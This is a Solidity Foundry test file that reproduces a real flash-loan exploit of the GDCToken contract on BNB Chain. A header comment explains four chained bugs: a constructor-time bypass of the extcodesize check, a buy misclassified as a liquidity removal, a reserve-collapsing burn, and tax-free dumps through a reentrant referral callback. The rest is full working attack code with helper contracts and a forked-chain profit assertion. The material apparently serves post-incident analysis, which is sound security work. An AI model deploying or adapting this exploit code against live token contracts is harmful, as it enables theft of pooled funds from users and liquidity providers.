// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// GDC (GDCToken) - referral reward reentrancy + tax-free direct pair.swap dump, over a burn-collapsed
// reserve - BNB Chain. Attacker net gain ~35.34 BNB in the single exploit tx.
//
// Attack tx      : 0xf12ccb683c51cc1c5907d362f3219b3a49a597be1fdfe1fb36bb2361bb3db877 (block 121253214)
// Attacker EOA   : 0xe327b58233DE729D58d35e36E4B6D45c8e00cDbb
// Exploit (on-chain, contract-creation tx): 0x5fe1deb9d9a58e9424b7fafc77494ff782b7dc14
//                 -> deployed an inner orchestrator 0x5fA62a1F...691a which was the Moolah flash-loan
//                    borrower AND the choreography hub. This PoC keeps that split conceptually but merges
//                    the borrower/hub role into GDCExploit; the two disposable helpers d1 / f95 are
//                    reconstructed as GDCHelper instances (matching the real 0xd1dC1F.. and 0xf95B62.. ).
// GDC token      : 0xe3342358e7ccbaebdd1139ad0274c53c5b3ef822  (GDCToken, verified)
// Pair GDC/WBNB  : 0x9cd8d04c30ed78afef7ed00ab1a2a028d476331c  (PancakeV2, token0 = WBNB, token1 = GDC)
// Moolah pool    : 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c  (Lista/Morpho-fork; 0% flashLoan(token,assets,data))
// WBNB           : 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
//
// ROOT CAUSE - a chain of four GDCToken bugs, each verified against the on-chain source and the attack trace:
//   1. EOA gate is extcodesize-only. receive()/depositFor reject callers with code, but a helper deposits
//      inside its OWN constructor (extcodesize == 0 at that point), so a contract passes isContract().
//      The deposit sets addLiquidityUnlockTime[helper] > 0 and users[helper].hasDeposited = true.
//   2. "buy as remove" misclassification. In _update, any transfer FROM the pair to an address that has a
//      deposit record (addLiquidityUnlockTime > 0) is flagged isRemove = true, which skips the
//      BuyingProhibited() revert. So a deposited helper can BUY GDC out of the pair with a raw pair.swap.
//   3. burn-vs-input mismatch. On a taxed sell, swapSellAward forwards only SELL_USER_PERCENT = 30% of the
//      nominal amount back into the pair, but _burnSellAgainstPair(user, amount) then burns the FULL nominal
//      amount out of the pair's own reserve and calls sync(). The GDC reserve collapses far below the WBNB
//      it is meant to back (down to LP_MIN_BALANCE = 21,000,000e18 in the limit).
//   4. reentrant tax-free exit. A sell sets swapping = true for its whole body; while swapping == true the
//      "to == uniswapPair" taxed branch of _update is skipped (guarded by if(!swapping)), so a GDC transfer
//      into the pair is a plain untaxed ERC20 move. swapSellAward pays referral rewards mid-body via
//      _sendBNB -> raw address.call{value:}, so an attacker helper registered as the seller's inviter gets a
//      re-entrant callback INSIDE that swapping window and can dump a pre-bought GDC bag straight through
//      pair.swap, tax-free, against the collapsed reserve.
//
// Choreography (one Moolah flash loan funds the working capital; two reentrancy windows extract the value):
//   setup) deploy d1 (deposits 0.1 BNB in its ctor -> deposit record + hasDeposited, inviter auto = company)
//          deploy f95 (bindReferrer(d1) then deposits 0.1 BNB -> effectiveReferralCount[d1] = 1, so d1 now
//          qualifies as f95's level-1 referrer and will receive the _sendBNB callback on any f95 sell).
//   window 1) hub buys 221.24M GDC out to f95 (bug 2). f95 sells (bag - 1 GDC): swapSellAward runs with
//             swapping == true and pays d1 the level-1 referral in BNB (bug 4). Inside d1's callback d1
//             spends 365.56 WBNB to buy a 1.63e9 GDC bag out of the pair (bug 2) - this also loads the pair
//             with WBNB. After the sell returns, _burnSellAgainstPair has collapsed the GDC reserve (bug 3);
//             the hub swaps f95's leftover 30% (~66.37M GDC) sitting in the pair for 230.83 WBNB.
//   window 2) f95 sells its last 1 GDC -> another d1 callback -> d1 dumps its whole 1.63e9 bag straight into
//             the pair and swaps out 176.77 WBNB to the hub (bug 4 + the still-collapsed reserve).
//   close)  repay the flash loan; net ~35.34 WBNB stays with the attacker.
//
// The two windows only net positive TOGETHER: window 1 alone injects 372 WBNB and pulls 230.83 back, and
// d1's bag cost 365.56 to buy and returns 176.77 - each leg is a loss on its own. The profit is the WBNB
// backing of the 221.24M GDC that bug 3 burned out of the pair for free, captured across both dumps.
//
// Numbers below are reproduced live on a fork of the parent block, not asserted from the trace.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IGDC is IERC20 {
    function bindReferrer(address referrer) external;
    function inviter(address) external view returns (address);
    function effectiveReferralCount(address) external view returns (uint256);
    function addLiquidityUnlockTime(address) external view returns (uint256);
}

interface IPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

// PancakeV2 constant-product output, 0.25% fee (numerator 9975 / 10000).
library AmmMath {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975;
        return (amountInWithFee * reserveOut) / (reserveIn * 10_000 + amountInWithFee);
    }
}

// A disposable per-role helper. Its constructor deposits into GDC while its own code size is still 0
// (bug 1), which both registers the deposit record that later lets it buy out of the pair (bug 2) and,
// combined with bindReferrer, wires it into the referral tree so it earns the mid-sell _sendBNB callback.
contract GDCHelper {
    address internal immutable owner;
    IGDC internal immutable gdc;
    IPair internal immutable pair;
    IWBNB internal immutable wbnb;
    address internal immutable hub;
    bool internal immutable wbnbIsToken0;

    // 0 = idle (just accept BNB), 1 = buy a GDC bag in the callback, 2 = dump the whole GDC bag in the callback
    uint8 public action;

    constructor(IGDC _gdc, IPair _pair, IWBNB _wbnb, address _hub, address referrer, uint256 depositValue) payable {
        owner = msg.sender;
        gdc = _gdc;
        pair = _pair;
        wbnb = _wbnb;
        hub = _hub;
        wbnbIsToken0 = (_pair.token0() == address(_wbnb));
        if (referrer != address(0)) {
            _gdc.bindReferrer(referrer);
        }
        // Deposit during construction: msg.sender is this contract, whose extcodesize is 0 right now, so
        // GDCToken.isContract(this) == false and receive() accepts the deposit.
        (bool ok,) = address(_gdc).call{value: depositValue}("");
        require(ok, "deposit failed");
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function arm(uint8 a) external onlyOwner {
        action = a;
    }

    // Called by the owner when this helper is the seller. from == this so inviter[this] drives the referral,
    // delivering the _sendBNB callback to whichever helper we registered as this one's referrer.
    function sell(uint256 amount) external onlyOwner {
        gdc.transfer(address(pair), amount);
    }

    // Straight untaxed dump used to close out any residual bag once the windows are done.
    function dumpAll() external onlyOwner returns (uint256 out) {
        out = _dump(hub);
    }

    // The re-entrant callback. GDCToken pays referral rewards via a raw call, landing here mid-sell while
    // swapping == true, so both the buy and the dump below run through the untaxed direct-pair path.
    receive() external payable {
        uint8 a = action;
        if (a == 1) {
            action = 0;
            _buyWithHeldWbnb();
        } else if (a == 2) {
            action = 0;
            _dump(hub);
        }
        // a == 0: just accept the BNB (deposit-time referral dust etc.)
    }

    // Spend the WBNB the hub pre-funded us with to buy a GDC bag straight out of the pair (bug 2). The bag
    // stays here; the WBNB we push in loads the pair for the later dumps.
    function _buyWithHeldWbnb() internal {
        uint256 amountIn = wbnb.balanceOf(address(this));
        if (amountIn == 0) return;
        wbnb.transfer(address(pair), amountIn);
        (uint112 r0, uint112 r1,) = pair.getReserves();
        (uint256 rWbnb, uint256 rGdc) = wbnbIsToken0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 gdcOut = AmmMath.getAmountOut(amountIn, rWbnb, rGdc);
        if (wbnbIsToken0) {
            pair.swap(0, gdcOut, address(this), "");
        } else {
            pair.swap(gdcOut, 0, address(this), "");
        }
    }

    // Dump the entire GDC balance into the pair (untaxed while swapping == true) and swap out WBNB to `to`.
    function _dump(address to) internal returns (uint256 wbnbOut) {
        uint256 gdcIn = gdc.balanceOf(address(this));
        if (gdcIn == 0) return 0;
        (uint112 r0, uint112 r1,) = pair.getReserves();
        (uint256 rWbnb, uint256 rGdc) = wbnbIsToken0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        gdc.transfer(address(pair), gdcIn);
        wbnbOut = AmmMath.getAmountOut(gdcIn, rGdc, rWbnb);
        if (wbnbIsToken0) {
            pair.swap(wbnbOut, 0, to, "");
        } else {
            pair.swap(0, wbnbOut, to, "");
        }
    }
}

// Flash-loan borrower and choreography hub (the on-chain 0x5fA62a1F role).
contract GDCExploit {
    IGDC internal constant GDC = IGDC(0xE3342358E7CcBAEbDD1139aD0274c53c5b3EF822);
    IPair internal constant PAIR = IPair(0x9CD8D04C30ED78AfeF7eD00Ab1A2a028d476331C);
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IMoolah internal constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

    // Working capital taken from Moolah (repaid in full, 0 fee). Only ~372 WBNB is actually put to work.
    uint256 internal constant LOAN = 500 ether;
    // Attack parameters (the buy sizes the real attacker chose); GDC outputs are computed live.
    uint256 internal constant F95_BUY_WBNB = 6.5 ether;
    uint256 internal constant D1_BUY_WBNB = 365.564188762178096308 ether;
    uint256 internal constant DEPOSIT = 0.1 ether;

    address internal immutable owner;
    bool internal wbnbIsToken0;
    GDCHelper internal d1;
    GDCHelper internal f95;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "not owner");
        MOOLAH.flashLoan(address(WBNB), LOAN, "");
        // Everything the flash loan does happens in onMoolahFlashLoan; forward the profit out.
        uint256 bal = WBNB.balanceOf(address(this));
        WBNB.withdraw(bal);
        payable(owner).transfer(address(this).balance);
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MOOLAH), "not moolah");
        wbnbIsToken0 = (PAIR.token0() == address(WBNB));

        // Native BNB to fund the two 0.1 BNB constructor deposits.
        WBNB.withdraw(2 * DEPOSIT);

        // Helper d1: deposits (bug 1) -> deposit record + hasDeposited; inviter auto-binds to company.
        d1 = new GDCHelper{value: DEPOSIT}(GDC, PAIR, WBNB, address(this), address(0), DEPOSIT);
        // Helper f95: binds d1 as referrer, then deposits -> effectiveReferralCount[d1] becomes 1, so a
        // later f95 sell pays d1 the level-1 referral and re-enters d1 (bug 4).
        f95 = new GDCHelper{value: DEPOSIT}(GDC, PAIR, WBNB, address(this), address(d1), DEPOSIT);

        // --- WINDOW 1 -------------------------------------------------------------------------------------
        // Buy a 221.24M GDC bag straight out of the pair to f95 (bug 2: pair -> f95 is flagged isRemove).
        uint256 f95Bag = _buyTo(address(f95), F95_BUY_WBNB);

        // Fund d1 with the WBNB it will spend inside its callback, and arm it to buy.
        WBNB.transfer(address(d1), D1_BUY_WBNB);
        d1.arm(1);

        // f95 sells almost the whole bag (keeps 1 GDC for the second trigger). This runs swapSellAward with
        // swapping == true: d1's callback fires and buys its 1.63e9 bag; then _burnSellAgainstPair collapses
        // the GDC reserve, and f95's untaxed 30% remainder is left sitting in the pair.
        f95.sell(f95Bag - 1 ether);

        // Sweep f95's leftover 30% (now excess GDC balance in the pair) for WBNB at the collapsed reserve.
        _sweepPairExcess();

        // --- WINDOW 2 -------------------------------------------------------------------------------------
        // Arm d1 to dump, then trigger with f95's last 1 GDC. d1 dumps its whole 1.63e9 bag tax-free into the
        // still-collapsed pair and swaps the WBNB out to this hub.
        d1.arm(2);
        f95.sell(1 ether);

        // Belt-and-suspenders: if any GDC bag remained on d1, close it out (no-op when already dumped).
        if (GDC.balanceOf(address(d1)) > 0) {
            d1.dumpAll();
        }

        // Repay the flash loan (Moolah pulls via transferFrom).
        WBNB.approve(address(MOOLAH), assets);
    }

    // Buy GDC out of the pair to `to`, pushing `wbnbIn` WBNB in first. Works because `to` has a deposit
    // record so the pair -> `to` transfer is misclassified as a liquidity removal instead of a buy.
    function _buyTo(address to, uint256 wbnbIn) internal returns (uint256 gdcOut) {
        WBNB.transfer(address(PAIR), wbnbIn);
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        (uint256 rWbnb, uint256 rGdc) = wbnbIsToken0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        gdcOut = AmmMath.getAmountOut(wbnbIn, rWbnb, rGdc);
        if (wbnbIsToken0) {
            PAIR.swap(0, gdcOut, to, "");
        } else {
            PAIR.swap(gdcOut, 0, to, "");
        }
    }

    // After a collapsing sell, the seller's untaxed 30% remainder is extra GDC sitting in the pair above its
    // recorded reserve. Swap exactly that excess out for WBNB.
    function _sweepPairExcess() internal {
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        (uint256 rWbnb, uint256 rGdc) = wbnbIsToken0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 gdcBal = GDC.balanceOf(address(PAIR));
        if (gdcBal <= rGdc) return;
        uint256 excess = gdcBal - rGdc;
        uint256 wbnbOut = AmmMath.getAmountOut(excess, rGdc, rWbnb);
        if (wbnbIsToken0) {
            PAIR.swap(wbnbOut, 0, address(this), "");
        } else {
            PAIR.swap(0, wbnbOut, address(this), "");
        }
    }
}

contract GDC_exp is Test {
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address internal constant ATTACKER = 0xe327b58233DE729D58d35e36E4B6D45c8e00cDbb;

    function setUp() public {
        vm.createSelectFork("bsc", 121_253_213); // parent block of the exploit tx (121253214)
    }

    function testExploit() public {
        vm.startPrank(ATTACKER, ATTACKER);
        uint256 balBefore = ATTACKER.balance;

        GDCExploit exploit = new GDCExploit();
        exploit.attack();

        uint256 profit = ATTACKER.balance - balBefore;
        vm.stopPrank();

        emit log_named_decimal_uint("attacker BNB profit", profit, 18);
        assertApproxEqRel(profit, 35.337151495976986490 ether, 0.03e18, "profit off expected ~35.34 BNB");
    }
}
